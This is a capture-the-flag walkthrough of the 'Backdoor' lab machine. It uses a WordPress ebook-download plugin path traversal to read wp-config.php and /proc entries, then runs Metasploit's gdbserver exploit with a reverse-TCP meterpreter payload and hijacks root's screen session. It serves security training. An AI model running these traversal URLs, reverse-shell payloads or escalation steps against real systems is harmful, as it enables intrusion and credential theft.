Connecting to port 1337 with `telnet` or `nc` doesn't tell us anything about the service so we'll look at the Wordpress site on port 80 first.

I also ran `gobuster` on the site.

```

Looking around the page, we can see that the "Home" button points to `backdoor.htb` so we add that to our `/etc/hosts`. Looking back at the `wpscan` results, we have an out-of-date version of the `ebook-download` plugin so we look for exploits for it.

```sh
$ searchsploit ebook download
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path

------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We have directory traversal. With `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`, we can grab the configuration file. Within the config is credentials.

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
```

We can't use those credentials to log into Wordpress, however. I also tried using them on port 1337 but to no avail.

```sh
$ telnet backdoor.htb 1337
Trying 10.129.238.61...
Connected to backdoor.htb.
Escape character is '^]'.
wordpressuser
MQYBJSaD#DxG6qbm
```

```sh
$ telnet backdoor.htb 1337
Trying 10.129.238.61...
Connected to backdoor.htb.
Escape character is '^]'.
MQYBJSaD#DxG6qbm
```

Exfiltrating `/etc/passwd`, we get the user `user`.

```sh
$ cat passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

I then tried to SSH in as `user` with the previously found password but that didn't work either. I also tried exfiltrating user's SSH key which also didn't work.

I then exfiltrated running command-line programs.

```sh
$ seq 1 1000 | while read line; do curl "backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$line/cmdline" -s > $line; done
```

Looking for port 1337, we can find `gdbserver` is running.

```sh
$ strings * | grep 1337
while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

Looking up `gdbserver` in `msfconsole`, we get an exploit.

```
msf6 > search gdbserver

msf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > run
```

Running the exploit should give us a meterpreter shell on the machine. After getting a shell, I put my SSH key on the machine to get an SSH shell.

Looking at listening ports ...

```sh
user@Backdoor:~$ ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*

```

We have MySQL running on port 3306 which we can connect to using wordpressuser's previously found credentials.

```sh
user@Backdoor:~$ mysql -u wordpressuser -p
```

Looking around the `wordpress` database, we can find admin's password hash.

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |

+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
```

I tried cracking the hash with rockyou but got nothing. I then ran linpeas. Among the running processes is `screen` run by root.

```
root         955  0.0  0.0   2608  1760 ?        Ss   Nov22   0:16      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```

We can attach root's `screen` with `screen -r root/root` and root the box.
